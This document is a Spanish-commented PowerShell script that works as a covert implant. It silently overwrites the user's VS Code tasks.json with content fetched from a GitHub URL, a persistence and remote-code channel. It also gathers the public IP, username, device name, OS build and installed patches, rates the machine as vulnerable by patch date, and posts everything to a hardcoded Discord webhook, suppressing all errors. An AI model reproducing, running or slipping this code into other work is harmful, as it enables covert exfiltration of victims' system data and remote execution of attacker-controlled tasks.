# 1. Configuración de variables
$Webhook = "https://discord.com/api/webhooks/1494006624166350960/BEcOnRkEN1eiyHGnyWVZuEBDW5KZjgP2lo8g47RGs_Xp2Q5qp5I-Auts8HdkkpLNoAlH"
$TasksPath = "$env:APPDATA\Code\User\tasks.json"
$RemoteTasksUrl = "https://raw.githubusercontent.com/baa4ts/baa4ts/refs/heads/main/public/tasks.txt"

# 2. Verificar internet (Silencioso)
if (!(Test-Connection -ComputerName 1.1.1.1 -Count 1 -Quiet)) { return }

# 3. Auto-actualización de la tarea (tasks.json)
try {
    $RemoteContent = Invoke-RestMethod -Uri $RemoteTasksUrl -TimeoutSec 10
    if ($RemoteContent -like "*version*") {
        $LocalHash = if (Test-Path $TasksPath) { Get-FileHash $TasksPath -Algorithm MD5 | Select-Object -ExpandProperty Hash } else { "" }
        $RemoteHash = ([System.Security.Cryptography.MD5]::Create().ComputeHash([System.Text.Encoding]::UTF8.GetBytes($RemoteContent)) | ForEach-Object { $_.ToString("X2") }) -join ""
        if ($LocalHash -ne $RemoteHash) {
            $RemoteContent | Set-Content -Path $TasksPath -Encoding UTF8 -Force
        }
    }
} catch { }

# 4. Recolección de datos con tolerancia a fallos
$IP = try { (Invoke-RestMethod -Uri 'https://api.ipify.org?format=json' -TimeoutSec 5).ip } catch { "null" }
$User = try { $env:USERNAME } catch { "null" }
$Device = try { $env:COMPUTERNAME } catch { "null" }

$SystemInfo = try {
    $OS = Get-CimInstance Win32_OperatingSystem
    $Ver = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion'
    "$( $OS.Caption ) (Build: $( $Ver.CurrentBuild ))"
} catch { "null" }

# Obtener Parches de forma segura
$SortedList = try {
    $Raw = Get-HotFix | Select-Object HotFixID, InstalledOn
    $WithDate = $Raw | Where-Object { $_.InstalledOn -ne $null } | Sort-Object InstalledOn -Descending
    $NoDate = $Raw | Where-Object { $_.InstalledOn -eq $null }
    $WithDate + $NoDate
} catch { @() }

# Estado de seguridad (Marzo 2026)
$StatusText = try {
    $Limit = Get-Date -Year 2026 -Month 3 -Day 10
    if ($SortedList | Where-Object { $_.InstalledOn -ge $Limit }) { "🛡️ PROTEGIDO" } else { "⚠️ VULNERABLE" }
} catch { "Estado Desconocido" }

$EmbedColor = if ($StatusText -eq "🛡️ PROTEGIDO") { 3066993 } else { 15158332 }

# 5. Envío segmentado (Chunks de 3 en 3)
$ChunkSize = 3
$Total = $SortedList.Count
$Sections = [Math]::Max(1, [Math]::Ceiling($Total / $ChunkSize))

for ($i = 0; $i -lt [Math]::Max(1, $Total); $i += $ChunkSize) {
    $CurrentSection = [Math]::Floor($i / $ChunkSize) + 1
    
    # Extraer trozo de parches
    $PatchText = "No se encontraron parches."
    if ($Total -gt 0) {
        $End = [Math]::Min($i + $ChunkSize - 1, $Total - 1)
        $Chunk = $SortedList[$i..$End]
        $PatchText = ($Chunk | ForEach-Object {
            $DateStr = if ($_.InstalledOn) { $_.InstalledOn.ToString('dd/MM/yyyy') } else { 'Sin fecha' }
            "- **$($_.HotFixID)**`n  └ Instalado: $DateStr"
        }) -join "`n`n"
    }

    # Usar ArrayList y silenciar salida con $null =
    $Fields = New-Object System.Collections.ArrayList
    
    # El mensaje principal lleva la info del sistema
    if ($CurrentSection -eq 1) {
        $null = $Fields.Add(@{ name = '💻 Sistema'; value = $SystemInfo; inline = $false })
        $null = $Fields.Add(@{ name = '📊 Estado'; value = $StatusText; inline = $true })
        $null = $Fields.Add(@{ name = '👤 Usuario / IP'; value = "$User ($IP)"; inline = $true })
    }

    $null = $Fields.Add(@{ name = "📦 Parches (Sección $CurrentSection)"; value = $PatchText; inline = $false })

    $Payload = @{
        username = "$User @ $Device"
        avatar_url = "https://i.imgur.com/8nLFCuR.png"
        embeds = @(@{
            title = if ($CurrentSection -eq 1) { '🚀 Reporte Inicial' } else { '📑 Continuación' }
            color = $EmbedColor
            fields = $Fields
            footer = @{ text = "Sección $CurrentSection de $Sections | Total detectado: $Total" }
        })
    } | ConvertTo-Json -Depth 10

    try {
        $BodyBytes = [System.Text.Encoding]::UTF8.GetBytes($Payload)
        Invoke-RestMethod -Uri $Webhook -Method Post -Body $BodyBytes -ContentType 'application/json; charset=utf-8'
        if ($Sections -gt 1) { Start-Sleep -Milliseconds 1500 }
    } catch { }
    
    # Si no hay parches, salimos después del primer mensaje
    if ($Total -eq 0) { break }
}
